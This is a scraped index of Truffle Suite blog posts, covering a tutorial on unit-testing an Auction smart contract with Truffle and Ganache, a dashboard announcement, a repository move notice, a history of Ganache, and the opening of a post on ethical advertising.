Automated tests can be written in both JavaScript/TypeScript and Solidity, with both having their respective advantages and disadvantages. Writing unit tests for your smart contract \u00b6 All test files will be located in the ./test directory. Truffle will only run test files with the following file extensions: .js, .ts, .es, .es6, and .jsx, and .sol. All other files are ignored. Now go ahead and create a test file inside the ./test directory and call it auction.js . To help us with asserting reverts and checking if certain events were emitted during our test, we\u2019ll need to install the truffle-assertions library from NPM by running the command npm install -d truffle-assertions . We\u2019ll also need some helper functions to help with things like getting the latest block timestamp and advancing the current time forward. To do that, let us create a file on the root of our project (outside the ./test directory) and call it helpers.js . Now copy over the following content into the helper file: const rpcPromise = ( rpcData ) => { return new Promise (( resolve , reject ) => { const data = { id : new Date (). getTime (), jsonrpc : \"2.0\" }; web3 . currentProvider . send ({ ... data , ... rpcData }, ( err , result ) => { if ( err ) return reject ( err ); return resolve ( result . result ); }); }); }; const mineBlock = () => rpcPromise ({ method : \"evm_mine\" }); const advanceTimeTo = async ( timestampInSecs ) => { if ( ! timestampInSecs ) return ; const msg = `Jump to future request: ${ timestampInSecs } \\n\\t ${ new Date ( timestampInSecs * 1000 ) } ` ; const setTimeResult = await rpcPromise ({ method : \"evm_setTime\" , params : [ timestampInSecs * 1000 ], // yea milliseconds }); return mineBlock (); }; const getLatestBlockTimestamp = async () => { const block = await rpcPromise ({ method : \"eth_getBlockByNumber\" , params : [ \"latest\" , false ], }); const ts = block . timestamp ; const timestamp = parseInt ( ts , 16 ); return timestamp ; }; module . exports = { advanceTimeTo , getLatestBlockTimestamp , }; With the helper functions out of the way, let's delve into the actual test cases. We\u2019ll start by importing the Auction contract artifact, the assertion library and our helper functions. For more information on how the artifacts.require command works, check out this documentation . const Auction = artifacts . require ( \"Auction\" ); const truffleAssert = require ( \"truffle-assertions\" ); const { getLatestBlockTimestamp , advanceTimeTo , } = require ( \"../ganache-helpers.js\" ); ... Now some actual test cases ... contract ( \"Auction\" , ( accounts ) => { // Before auction start it ( \"should not allow a bid until the auction has started\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . bid ({ value : 100 }), \"not started\" ); }); // After auction start it ( \"should not allow the auction to end early\" , async () => { const auctionInstance = await Auction . deployed (); // Start an auction await auctionInstance . start (); await truffleAssert . reverts ( auctionInstance . end (), \"end time in future\" ); }); it ( \"should have an opening bid of 100 wei\" , async () => { const auctionInstance = await Auction . deployed (); const highestBid = ( await auctionInstance . highestBid . call ()). toNumber (); assert . equal ( highestBid , 100 , \"opening bid is not equal to 100 wei\" ); }); it ( \"should not accept a bid lower than or equal to the current bid\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( // Using accounts[9] as a stand-in for an NFT address auctionInstance . methods [ \"bid(address,uint256)\" ]( accounts [ 9 ], 1 , { value : 100 , }), \"value < highest\" ); }); it ( \"should not accept a bid if the user has not provided an NFT address\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . bid ({ value : 100 }), \"include nft to display\" ); }); it ( \"should not accept a bid if the user has provided an empty NFT address\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . methods [ \"bid(address,uint256)\" ]( \"0x0000000000000000000000000000000000000000\" , 1 , { value : 100 } ), \"invalid nft address\" ); }); it ( \"should accept a bid higher than the current bid with an NFT address\" , async () => { const auctionInstance = await Auction . deployed (); // Using accounts[9] as a stand-in for an NFT address await auctionInstance . methods [ \"bid(address,uint256)\" ]( accounts [ 9 ], 1 , { value : 101 , }); const highestBId = ( await auctionInstance . highestBid . call ()). toNumber (); assert . equal ( highestBId , 101 , \"opening bid is not equal to 100 wei\" ); }); it ( \"should allow the auction to end after 1 day\" , async () => { const auctionInstance = await Auction . deployed (); // Gets the timestamp for 1 day from the current block in seconds const timestamp = await getLatestBlockTimestamp (); const nextDay = timestamp + 86400 ; await advanceTimeTo ( nextDay ); const tx = await auctionInstance . end (); truffleAssert . eventEmitted ( tx , \"End\" ); }); }); The test case descriptions are self-explanatory so it\u2019s clear what we\u2019re doing in each. If you\u2019ve ever written unit tests for a JavaScript project with Mocha, you will notice how similar the structure of our test cases are to a Mocha test, and this is because Truffle uses Mocha under the hood with a few tweaks like using contract() instead of the describe() keyword. Besides the difference in choice of keywords, both contract() and describe() do the exact same thing, which is to group test cases logically, and in the case of Truffle, by contracts. This means if you have more than one contract to test, you can technically have all the test cases in one file, separating them with the contract() method. Running your tests \u00b6 Since we\u2019re not using the standalone Ganache yet (will be covered in a later post ), we\u2019ll have to rely on the internal, somewhat basic Ganache that comes bundled with the Truffle CLI. To spin it up, simply run the truffle develop command. There are a number of ways to run your tests in Truffle, one way is to run all tests together with the command test , and another way is to specify the test file to run like so test ./test/<FILENAME> , e.g test ./test/auction.js . For more information on additional options you can pass in while running the test, see the command reference documentation . Whichever way you choose to use, if you\u2019ve done everything correctly, you should see some nice green check marks, signifying that your test cases are all passing. Congrats! What\u2019s next? \u00b6 That\u2019s it for writing and running automated unit tests for your smart contract. In this case we\u2019ve used JavaScript, but the same rules apply if you want to use TypeScript, the only difference is that you\u2019ll need to set up your Truffle project to use TypeScript. If you\u2019re curious enough and willing to dig deeper into testing with Truffle, try out creating some more test cases for your smart contract but this time in Solidity. It\u2019s mostly the same concepts, check out the Truffle documentation of writing tests in Solidity to get started. In part three, we\u2019ll explore ways in which adding Ganache to our workflow can improve our productivity by providing some form of visibility of what happens under the hood. Until then, keep an eye on Truffle's Twitter and our GitHub Discussions page for more updates. We also hold weekly live-streamed sessions called Web3 Unleashed, where we build, interview developers in the web3 community, and discuss important developments across the ecosystem. You can find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "From Idea to Minimum Viable Dapp - Truffle Command Line Interface Part 2"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-2/#writing-unit-tests-for-your-smart-contract", "text": "All test files will be located in the ./test directory. Truffle will only run test files with the following file extensions: .js, .ts, .es, .es6, and .jsx, and .sol. All other files are ignored. Now go ahead and create a test file inside the ./test directory and call it auction.js . To help us with asserting reverts and checking if certain events were emitted during our test, we\u2019ll need to install the truffle-assertions library from NPM by running the command npm install -d truffle-assertions . We\u2019ll also need some helper functions to help with things like getting the latest block timestamp and advancing the current time forward. To do that, let us create a file on the root of our project (outside the ./test directory) and call it helpers.js . Now copy over the following content into the helper file: const rpcPromise = ( rpcData ) => { return new Promise (( resolve , reject ) => { const data = { id : new Date (). getTime (), jsonrpc : \"2.0\" }; web3 . currentProvider . send ({ ... data , ... rpcData }, ( err , result ) => { if ( err ) return reject ( err ); return resolve ( result . result ); }); }); }; const mineBlock = () => rpcPromise ({ method : \"evm_mine\" }); const advanceTimeTo = async ( timestampInSecs ) => { if ( ! timestampInSecs ) return ; const msg = `Jump to future request: ${ timestampInSecs } \\n\\t ${ new Date ( timestampInSecs * 1000 ) } ` ; const setTimeResult = await rpcPromise ({ method : \"evm_setTime\" , params : [ timestampInSecs * 1000 ], // yea milliseconds }); return mineBlock (); }; const getLatestBlockTimestamp = async () => { const block = await rpcPromise ({ method : \"eth_getBlockByNumber\" , params : [ \"latest\" , false ], }); const ts = block . timestamp ; const timestamp = parseInt ( ts , 16 ); return timestamp ; }; module . exports = { advanceTimeTo , getLatestBlockTimestamp , }; With the helper functions out of the way, let's delve into the actual test cases. We\u2019ll start by importing the Auction contract artifact, the assertion library and our helper functions. For more information on how the artifacts.require command works, check out this documentation . const Auction = artifacts . require ( \"Auction\" ); const truffleAssert = require ( \"truffle-assertions\" ); const { getLatestBlockTimestamp , advanceTimeTo , } = require ( \"../ganache-helpers.js\" ); ... Now some actual test cases ... contract ( \"Auction\" , ( accounts ) => { // Before auction start it ( \"should not allow a bid until the auction has started\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . bid ({ value : 100 }), \"not started\" ); }); // After auction start it ( \"should not allow the auction to end early\" , async () => { const auctionInstance = await Auction . deployed (); // Start an auction await auctionInstance . start (); await truffleAssert . reverts ( auctionInstance . end (), \"end time in future\" ); }); it ( \"should have an opening bid of 100 wei\" , async () => { const auctionInstance = await Auction . deployed (); const highestBid = ( await auctionInstance . highestBid . call ()). toNumber (); assert . equal ( highestBid , 100 , \"opening bid is not equal to 100 wei\" ); }); it ( \"should not accept a bid lower than or equal to the current bid\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( // Using accounts[9] as a stand-in for an NFT address auctionInstance . methods [ \"bid(address,uint256)\" ]( accounts [ 9 ], 1 , { value : 100 , }), \"value < highest\" ); }); it ( \"should not accept a bid if the user has not provided an NFT address\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . bid ({ value : 100 }), \"include nft to display\" ); }); it ( \"should not accept a bid if the user has provided an empty NFT address\" , async () => { const auctionInstance = await Auction . deployed (); await truffleAssert . reverts ( auctionInstance . methods [ \"bid(address,uint256)\" ]( \"0x0000000000000000000000000000000000000000\" , 1 , { value : 100 } ), \"invalid nft address\" ); }); it ( \"should accept a bid higher than the current bid with an NFT address\" , async () => { const auctionInstance = await Auction . deployed (); // Using accounts[9] as a stand-in for an NFT address await auctionInstance . methods [ \"bid(address,uint256)\" ]( accounts [ 9 ], 1 , { value : 101 , }); const highestBId = ( await auctionInstance . highestBid . call ()). toNumber (); assert . equal ( highestBId , 101 , \"opening bid is not equal to 100 wei\" ); }); it ( \"should allow the auction to end after 1 day\" , async () => { const auctionInstance = await Auction . deployed (); // Gets the timestamp for 1 day from the current block in seconds const timestamp = await getLatestBlockTimestamp (); const nextDay = timestamp + 86400 ; await advanceTimeTo ( nextDay ); const tx = await auctionInstance . end (); truffleAssert . eventEmitted ( tx , \"End\" ); }); }); The test case descriptions are self-explanatory so it\u2019s clear what we\u2019re doing in each. If you\u2019ve ever written unit tests for a JavaScript project with Mocha, you will notice how similar the structure of our test cases are to a Mocha test, and this is because Truffle uses Mocha under the hood with a few tweaks like using contract() instead of the describe() keyword. Besides the difference in choice of keywords, both contract() and describe() do the exact same thing, which is to group test cases logically, and in the case of Truffle, by contracts. This means if you have more than one contract to test, you can technically have all the test cases in one file, separating them with the contract() method.", "title": "Writing unit tests for your smart contract"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-2/#running-your-tests", "text": "Since we\u2019re not using the standalone Ganache yet (will be covered in a later post ), we\u2019ll have to rely on the internal, somewhat basic Ganache that comes bundled with the Truffle CLI. To spin it up, simply run the truffle develop command. There are a number of ways to run your tests in Truffle, one way is to run all tests together with the command test , and another way is to specify the test file to run like so test ./test/<FILENAME> , e.g test ./test/auction.js . For more information on additional options you can pass in while running the test, see the command reference documentation . Whichever way you choose to use, if you\u2019ve done everything correctly, you should see some nice green check marks, signifying that your test cases are all passing. Congrats!", "title": "Running your tests"}, {"location": "blog/from-idea-to-minimum-viable-dapp-truffle-command-line-interface-part-2/#whats-next", "text": "That\u2019s it for writing and running automated unit tests for your smart contract. In this case we\u2019ve used JavaScript, but the same rules apply if you want to use TypeScript, the only difference is that you\u2019ll need to set up your Truffle project to use TypeScript. If you\u2019re curious enough and willing to dig deeper into testing with Truffle, try out creating some more test cases for your smart contract but this time in Solidity. It\u2019s mostly the same concepts, check out the Truffle documentation of writing tests in Solidity to get started. In part three, we\u2019ll explore ways in which adding Ganache to our workflow can improve our productivity by providing some form of visibility of what happens under the hood. Until then, keep an eye on Truffle's Twitter and our GitHub Discussions page for more updates. We also hold weekly live-streamed sessions called Web3 Unleashed, where we build, interview developers in the web3 community, and discuss important developments across the ecosystem. You can find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "What\u2019s next?"}, {"location": "blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/", "text": "As the operational needs of your dapp grow in complexity, it helps to be able to choose an area of focus. More incoming data begets a greater need to gain insights and properly segment that data to prevent overload. Wouldn\u2019t it be nice to see an overview of a particular deployed instance of your application with the ability to drill down into the parts you need to see in more detail? This is where the dashboard comes in! \ud83d\udcac The Dashboard feature could expand in many different directions and we need your help to prioritize what matters most for your dapps. In that spirit we\u2019ve released this first version quickly to get the conversation started. Please comment in the Truffler Slack workspace , email us , reach out any way you can--we\u2019re excited to hear from you. We first asked ourselves \u201cwhat is a dashboard\u201d? and surprisingly, got many different answers! We arrived at this definition: A dashboard is a place to see an overview of your application, along with ways to drill down and get further context on more narrow slices. The first release focuses mostly on the high-level, but we plan to increase the drilldown capabilities as the feature evolves. A Bird\u2019s Eye View \u00b6 The dashboard page with a deployment selected In this first version of the dashboard, you can pin a deployment for quick insights and visualization. Some of this information we haven\u2019t surfaced before, such as the deployment\u2019s cost and the number of unique addresses interacting with a deployment\u2019s contracts. CHECK OUT THE NEW DASHBOARD Looking Ahead \u00b6 Here\u2019s a bit of a teaser for you to get an idea of where this is going: A filter option to specify exactly which contracts are being displayed in the transaction graph A list of contracts providing the ability to hop into monitoring a specific contract instance or... Quickly interact with those contracts via our upcoming Contract Manager We strive for Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLE SLACK COMMUNITY Thanks! Josh Quintal, Head of Product & Marketing", "title": "Get a Bird's Eye View with Truffle Teams' New Dashboard"}, {"location": "blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/#a-birds-eye-view", "text": "The dashboard page with a deployment selected In this first version of the dashboard, you can pin a deployment for quick insights and visualization. Some of this information we haven\u2019t surfaced before, such as the deployment\u2019s cost and the number of unique addresses interacting with a deployment\u2019s contracts. CHECK OUT THE NEW DASHBOARD", "title": "A Bird\u2019s Eye View"}, {"location": "blog/get-a-birds-eye-view-with-truffle-teams-new-dashboard/#looking-ahead", "text": "Here\u2019s a bit of a teaser for you to get an idea of where this is going: A filter option to specify exactly which contracts are being displayed in the transaction graph A list of contracts providing the ability to hop into monitoring a specific contract instance or... Quickly interact with those contracts via our upcoming Contract Manager We strive for Truffle Teams to be the most effective DevOps tool in the blockchain space for both new and existing teams. Let us know what you think about this integration solution, and if your team has other needs we haven\u2019t met yet. Continue the conversation with your fellow Trufflers in our Slack community! SIGN UP FOR THE TRUFFLE SLACK COMMUNITY Thanks! Josh Quintal, Head of Product & Marketing", "title": "Looking Ahead"}, {"location": "blog/github-repository-moved/", "text": "We recently released Truffle 3.0 in February to much fanfare . As part of that release we separated our codebase into multiple different modules to make integrating with Truffle easier. Those modules now live in the github repository https://github.com/trufflesuite , which hints at our broader mission of providing a comprehensive suite of tools for Ethereum development. But something was missing... \u00b6 We forgot Truffle! The main Truffle repository -- including the Truffle command line tool -- remained at it's old Consensys location while its modules hung out at their new digs. We thought to ourselves: That just wouldn't do. So, as matter of announcement, Truffle has officially moved. It's new home is https://github.com/trufflesuite . Wait, there's more. \u00b6 The Truffle Suite repository will soon be filling up with more open-source tools to make your Ethereum development life easier. We're not ready to announce what those are yet, but stay tuned for some awesome announcements in the coming weeks. While you're here. \u00b6 While we're announcing things, we should let you know we have a new Twitter account: @trufflesuite . Feel free to reach out to use there for all your Truffle needs. Au revoir for now! -- Tim", "title": "We've moved our github repo!"}, {"location": "blog/github-repository-moved/#but-something-was-missing", "text": "We forgot Truffle! The main Truffle repository -- including the Truffle command line tool -- remained at it's old Consensys location while its modules hung out at their new digs. We thought to ourselves: That just wouldn't do. So, as matter of announcement, Truffle has officially moved. It's new home is https://github.com/trufflesuite .", "title": "But something was missing..."}, {"location": "blog/github-repository-moved/#wait-theres-more", "text": "The Truffle Suite repository will soon be filling up with more open-source tools to make your Ethereum development life easier. We're not ready to announce what those are yet, but stay tuned for some awesome announcements in the coming weeks.", "title": "Wait, there's more."}, {"location": "blog/github-repository-moved/#while-youre-here", "text": "While we're announcing things, we should let you know we have a new Twitter account: @trufflesuite . Feel free to reach out to use there for all your Truffle needs. Au revoir for now! -- Tim", "title": "While you're here."}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/", "text": "By Kingsley Arinze Did you know the Truffle local Ethereum simulator was inspired by the original Ethereum testnet? This story and more as we look back on the history of Truffle. Introduction \u00b6 Testnets are a fundamental part of the blockchain ecosystem, as they allow dapp and smart contract developers to fully test their applications in an environment that closely resembles the blockchain mainnet, but without the risk of losing real funds. Local blockchain simulators like Ganache take this a step further by making it possible to run an implementation of the Ethereum Virtual Machine (EVM) on your local machines, leading to faster testing and iteration speed during development. From the early days of Ethereum, Truffle has established itself as a pioneer in identifying and building the right tooling to further the blockchain ecosystem. With Layer 2 networks like Arbitrum, Polygon, and Optimism on the rise, there's a need for a more robust testing environment for dapp developers building on both layer 1 and layer 2 networks. New concerns arise, such as bridging between a layer 1 and a layer 2 or bridging between two layer 2s. This blog tells the story of the early days of the Truffle local Ethereum simulator, Ganache, how it started, who and what contributed to its growth, and how it has evolved into becoming the center of the Ethereum development experience. We\u2019ll also touch on what the future holds for the simulator and Truffle as we seek to support and build a multi-chain future. Eth-testRPC - The first Ethereum local simulator \u00b6 The first Ethereum local simulator was created by Truffle\u2019s founder, Tim Coulter. It was derived from original Python scripts that were written by the CTO and Founder of Gnosis, Stefan D George, during the early days of ConsenSys - days that Tim refers to as \u201cthe days of throwing cupcakes at the wall to see which could stick.\u201d Eth-testRPC stuck! Eth-testRPC was first introduced to the world by Tim at DevCon1 in January 2016. At the conference, Tim presented Dappstore, a before its time marketplace for dapps, and revealed how the Eth-testRPC had helped make it possible. But this was only some days before Tim was about to give up on his Dappstore due to issues with the local simulator not responding to requests. It was around this time that Tim discovered an alternative, which although responded to RPC requests, required a lot of rewrites and fixes for it to work as intended. This local simulator was Etherism. Etherism and the EthereumJS community - The entrance of Ethereum into the Javascript ecosystem \u00b6 Etherism was created in September 2015 by Luris Matias and became Tim\u2019s new obsession. Tim needed additional features and RPC methods to support his Dappstore, but since his custom-built simulator wasn\u2019t working as intended, he immediately started contributing to the EtherSim repository . About the same time, EthereumJS, a new community of Javascript developers and Ethereum enthusiasts, began to form. EthereumJS quickly became the entry point and home for new Javascript developers entering the Ethereum ecosystem. Tim saw this and took advantage of it by porting over his version of EtherSim, which, at this point, had diverged significantly from the master branch, to the EthereumJS community under the name EthereumJS-testRPC. 2016 through 2017 - Mainnet forking \u00b6 After joining the EthereumJS community, Truffle\u2019s local simulator, now EthereumJS-testRPC, would see the most growth and innovation. The Truffle team, together with other EthereumJS community members contributed to making the testRPC as close to the Mainnet as possible by adding other developer-focused features. The most notable innovation that happened around that time was the mainnet forking feature , which allowed developers to simulate having the exact same state as the Ethereum mainnet, but on their local machines. Tim would go ahead to create a demo that used this feature to fork mainnet and replay the 2016 DAO hack . Lately, Hardhat has received praise for creating the mainnet forking feature, but the first version of forking actually came out of the Truffle local simulator. Ganache - The blockchain simulator is born! \u00b6 Over time, the EthereumJS-testRPC would differentiate itself within the EthereumJS community, and as Tim would put it, \u201clike one of those things that was not like the others\u201d. EthereumJS represented the Virtual Machine layer and the testRPC, an application on top of it that was primarily maintained by the Truffle team. In the third year of conceiving and building the initial simulator, EthereumJS-testRPC was renamed to Ganache and became central to the web3 development experience for Ethereum dapp developers. Eventually, the Truffle team released a standalone GUI application that allowed users to see what was going on under the hood. Ganache\u2019s monthly usage exploded with popularity, especially since this feature made blockchain development more accessible for beginners. Truffle, which includes Ganache, has since grown to become one of the dominant tools in the blockchain ecosystem, amassing over 10 million downloads combined. As the multi-chain world had just started to take shape, the Truffle team, again acting as pioneers, began experimenting with simulating other chains, including Tezos, Corda, and Filecoin. This is a testament to the vision of the team, who, at the time, could see that we were headed towards a multi-chain future. Tezos, Corda, and Filecoin represent Truffle\u2019s early experiments to see whether or not Ganache could become a generic framework for blockchain simulators. Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details. What does the future hold for Truffle and its local blockchain simulator? \u00b6 The future of web3 is complex, characterized by multiple layer 1s and their corresponding layer 2s. It is clear, then, that the successful tools are the ones that can support and simplify all the complex nuances and problems that come with how these chains will interact. At Truffle, we\u2019ve identified these problems and have started making significant strides in solving them. Some of the features we\u2019re most excited to launch/have launched are: A protocol flavored Ganache : We\u2019ve been speaking to dapp developers over the past year and one recurring request we\u2019ve kept getting is the need for a protocol flavored Ganache - one that would have the rules of these layer 2 protocols baked in. We\u2019ve listened and are hard at work! We\u2019re getting ready to launch the infrastructure for Ganache Plugins. Ganache plugins would allow dapp developers building on layer 2s to continue using the Ganache experience they know and love. Imagine a world where a user would be able to have an Optimism Ganache, Arbitrum Ganache, and a Starknet Ganache! Declarative deployment : Imagine a scenario where you want to deploy contract A to a layer 2 blockchain, and then in the same breath, use the contract address of the deployed contract A to deploy contract B to another layer 2 or a layer 1 blockchain. To achieve this, you\u2019d need to write and maintain potentially complex scripts to manage the process. Given changing requirements, manually maintaining these scripts is a recipe for bugs and a developer\u2019s nightmare. Our solution for this multi-chain deployment problem: Truffle Declarative deployment . The goal is to tell Truffle what your completed project should look like and then Truffle would take it up from there, deploying your contracts in the order you\u2019ve described and to the chains or layers you\u2019ve specified, all while maintaining state, handling contract dependencies as well as deploying to multiple RPC endpoints. Truffle boxes : These are boilerplate code, similar to the Ruby on Rails scaffold, where running a simple command on your CLI will scaffold a new project, including all the directories you need as well as a detailed README with deployment instructions and things to be mindful of. As of now, Truffle has the Arbitrium box , the Optimism box , and the Polygon box all live and available for dapp developers to use. We\u2019re currently working on more advanced use cases for our boxes like the bridge box and starknet box. Truffle dashboard : This is a tool that removes the need to copy/paste your private keys into regular files during contract deployment. With Truffle dashboard running, you can connect through the UI and deploy contracts via MetaMask or Wallet connect. This was released in January, and we\u2019re working on implementing our multi-network approach to the Truffle Dashboard as well. Truffle for VS Code extension : This is a tool that allows you to perform all the actions you would perform with Truffle, but all within VS Code. It allows you to compile, debug, and deploy your contracts. This was released a few weeks ago, and we\u2019re working on making VS Code extension incorporate all these new layer 2 support tools. If you haven\u2019t already, you should definitely check out Truffle\u2019s local Ethereum blockchain simulator, Ganache , today, as well as the Truffle suite of tools that are available for dapp developers. You can get started by first visiting the Truffle website and documentation .", "title": "An homage to Truffle and its local Ethereum simulator, Ganache!"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#introduction", "text": "Testnets are a fundamental part of the blockchain ecosystem, as they allow dapp and smart contract developers to fully test their applications in an environment that closely resembles the blockchain mainnet, but without the risk of losing real funds. Local blockchain simulators like Ganache take this a step further by making it possible to run an implementation of the Ethereum Virtual Machine (EVM) on your local machines, leading to faster testing and iteration speed during development. From the early days of Ethereum, Truffle has established itself as a pioneer in identifying and building the right tooling to further the blockchain ecosystem. With Layer 2 networks like Arbitrum, Polygon, and Optimism on the rise, there's a need for a more robust testing environment for dapp developers building on both layer 1 and layer 2 networks. New concerns arise, such as bridging between a layer 1 and a layer 2 or bridging between two layer 2s. This blog tells the story of the early days of the Truffle local Ethereum simulator, Ganache, how it started, who and what contributed to its growth, and how it has evolved into becoming the center of the Ethereum development experience. We\u2019ll also touch on what the future holds for the simulator and Truffle as we seek to support and build a multi-chain future.", "title": "Introduction"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#eth-testrpc-the-first-ethereum-local-simulator", "text": "The first Ethereum local simulator was created by Truffle\u2019s founder, Tim Coulter. It was derived from original Python scripts that were written by the CTO and Founder of Gnosis, Stefan D George, during the early days of ConsenSys - days that Tim refers to as \u201cthe days of throwing cupcakes at the wall to see which could stick.\u201d Eth-testRPC stuck! Eth-testRPC was first introduced to the world by Tim at DevCon1 in January 2016. At the conference, Tim presented Dappstore, a before its time marketplace for dapps, and revealed how the Eth-testRPC had helped make it possible. But this was only some days before Tim was about to give up on his Dappstore due to issues with the local simulator not responding to requests. It was around this time that Tim discovered an alternative, which although responded to RPC requests, required a lot of rewrites and fixes for it to work as intended. This local simulator was Etherism.", "title": "Eth-testRPC - The first Ethereum local simulator"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#etherism-and-the-ethereumjs-community-the-entrance-of-ethereum-into-the-javascript-ecosystem", "text": "Etherism was created in September 2015 by Luris Matias and became Tim\u2019s new obsession. Tim needed additional features and RPC methods to support his Dappstore, but since his custom-built simulator wasn\u2019t working as intended, he immediately started contributing to the EtherSim repository . About the same time, EthereumJS, a new community of Javascript developers and Ethereum enthusiasts, began to form. EthereumJS quickly became the entry point and home for new Javascript developers entering the Ethereum ecosystem. Tim saw this and took advantage of it by porting over his version of EtherSim, which, at this point, had diverged significantly from the master branch, to the EthereumJS community under the name EthereumJS-testRPC.", "title": "Etherism and the EthereumJS community - The entrance of Ethereum into the Javascript ecosystem"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#2016-through-2017-mainnet-forking", "text": "After joining the EthereumJS community, Truffle\u2019s local simulator, now EthereumJS-testRPC, would see the most growth and innovation. The Truffle team, together with other EthereumJS community members contributed to making the testRPC as close to the Mainnet as possible by adding other developer-focused features. The most notable innovation that happened around that time was the mainnet forking feature , which allowed developers to simulate having the exact same state as the Ethereum mainnet, but on their local machines. Tim would go ahead to create a demo that used this feature to fork mainnet and replay the 2016 DAO hack . Lately, Hardhat has received praise for creating the mainnet forking feature, but the first version of forking actually came out of the Truffle local simulator.", "title": "2016 through 2017 - Mainnet forking"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#ganache-the-blockchain-simulator-is-born", "text": "Over time, the EthereumJS-testRPC would differentiate itself within the EthereumJS community, and as Tim would put it, \u201clike one of those things that was not like the others\u201d. EthereumJS represented the Virtual Machine layer and the testRPC, an application on top of it that was primarily maintained by the Truffle team. In the third year of conceiving and building the initial simulator, EthereumJS-testRPC was renamed to Ganache and became central to the web3 development experience for Ethereum dapp developers. Eventually, the Truffle team released a standalone GUI application that allowed users to see what was going on under the hood. Ganache\u2019s monthly usage exploded with popularity, especially since this feature made blockchain development more accessible for beginners. Truffle, which includes Ganache, has since grown to become one of the dominant tools in the blockchain ecosystem, amassing over 10 million downloads combined. As the multi-chain world had just started to take shape, the Truffle team, again acting as pioneers, began experimenting with simulating other chains, including Tezos, Corda, and Filecoin. This is a testament to the vision of the team, who, at the time, could see that we were headed towards a multi-chain future. Tezos, Corda, and Filecoin represent Truffle\u2019s early experiments to see whether or not Ganache could become a generic framework for blockchain simulators. Important The Corda flavor is deprecated and has been removed from Ganache UI in v2.7.0. See the release notes for details.", "title": "Ganache - The blockchain simulator is born!"}, {"location": "blog/homage-to-truffle-local-ethereum-simulator-ganache/#what-does-the-future-hold-for-truffle-and-its-local-blockchain-simulator", "text": "The future of web3 is complex, characterized by multiple layer 1s and their corresponding layer 2s. It is clear, then, that the successful tools are the ones that can support and simplify all the complex nuances and problems that come with how these chains will interact. At Truffle, we\u2019ve identified these problems and have started making significant strides in solving them. Some of the features we\u2019re most excited to launch/have launched are: A protocol flavored Ganache : We\u2019ve been speaking to dapp developers over the past year and one recurring request we\u2019ve kept getting is the need for a protocol flavored Ganache - one that would have the rules of these layer 2 protocols baked in. We\u2019ve listened and are hard at work! We\u2019re getting ready to launch the infrastructure for Ganache Plugins. Ganache plugins would allow dapp developers building on layer 2s to continue using the Ganache experience they know and love. Imagine a world where a user would be able to have an Optimism Ganache, Arbitrum Ganache, and a Starknet Ganache! Declarative deployment : Imagine a scenario where you want to deploy contract A to a layer 2 blockchain, and then in the same breath, use the contract address of the deployed contract A to deploy contract B to another layer 2 or a layer 1 blockchain. To achieve this, you\u2019d need to write and maintain potentially complex scripts to manage the process. Given changing requirements, manually maintaining these scripts is a recipe for bugs and a developer\u2019s nightmare. Our solution for this multi-chain deployment problem: Truffle Declarative deployment . The goal is to tell Truffle what your completed project should look like and then Truffle would take it up from there, deploying your contracts in the order you\u2019ve described and to the chains or layers you\u2019ve specified, all while maintaining state, handling contract dependencies as well as deploying to multiple RPC endpoints. Truffle boxes : These are boilerplate code, similar to the Ruby on Rails scaffold, where running a simple command on your CLI will scaffold a new project, including all the directories you need as well as a detailed README with deployment instructions and things to be mindful of. As of now, Truffle has the Arbitrium box , the Optimism box , and the Polygon box all live and available for dapp developers to use. We\u2019re currently working on more advanced use cases for our boxes like the bridge box and starknet box. Truffle dashboard : This is a tool that removes the need to copy/paste your private keys into regular files during contract deployment. With Truffle dashboard running, you can connect through the UI and deploy contracts via MetaMask or Wallet connect. This was released in January, and we\u2019re working on implementing our multi-network approach to the Truffle Dashboard as well. Truffle for VS Code extension : This is a tool that allows you to perform all the actions you would perform with Truffle, but all within VS Code. It allows you to compile, debug, and deploy your contracts. This was released a few weeks ago, and we\u2019re working on making VS Code extension incorporate all these new layer 2 support tools. If you haven\u2019t already, you should definitely check out Truffle\u2019s local Ethereum blockchain simulator, Ganache , today, as well as the Truffle suite of tools that are available for dapp developers. You can get started by first visiting the Truffle website and documentation .", "title": "What does the future hold for Truffle and its local blockchain simulator?"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/", "text": "CodeFund is an ethical ad platform that funds contributors to the open source ecosystem. Visit CodeFund to learn more and apply. The Conflicting Relationship Between Blockchain and Marketing \u00b6 In the initial years following Bitcoin\u2019s inception, most blockchain companies didn\u2019t need paid advertising. The early adopters were a community of cypherpunks, libertarians, developers, miners, and hobbyists, that truly believed in the power of decentralized networks. To them, adoption was inevitable, and rather than putting paid ads in front of the general public, resources were better spent building wallets, development tools, infrastructure, and scalability solutions. Additionally, almost all early blockchain users and entrepreneurs were extremely privacy-conscious. Pseudonymity is a key component to cryptocurrencies, they wouldn\u2019t work in a permissionless manner without it. The Adtech industry, on the other hand, is run by monolithic centralized powerhouses that gather and store immense amounts of personal data for precise targeting. For the first 5 years of Bitcoin, the blockchain community ethos was quite literally the polar opposite of the advertising industry . That\u2019s not to say that in the early days exchanges, wallets, and other blockchain 